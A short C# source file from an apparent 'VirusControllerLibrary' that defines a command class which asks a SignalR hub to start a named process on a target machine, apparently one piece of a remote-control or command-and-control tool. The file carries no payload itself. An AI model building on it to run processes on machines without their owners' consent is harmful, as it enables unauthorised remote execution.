using Microsoft.AspNetCore.SignalR.Client;
using System.Threading.Tasks;

namespace VirusControllerLibrary
{
    public class StartProcessCommand : AdminHubCommand, IHaveOneTargetCommand
    {
        public string TargetId { get; private set; }
        public string ProcessName { get; private set; }
        public override string Name => "StartProcess";

        public StartProcessCommand(string targetId, string processName)
        {
            TargetId = targetId;
            ProcessName = processName;
        }

        public override async Task ExecuteAsync() =>
            await _hubConnection?.InvokeAsync(Name, TargetId, ProcessName);
    }
}
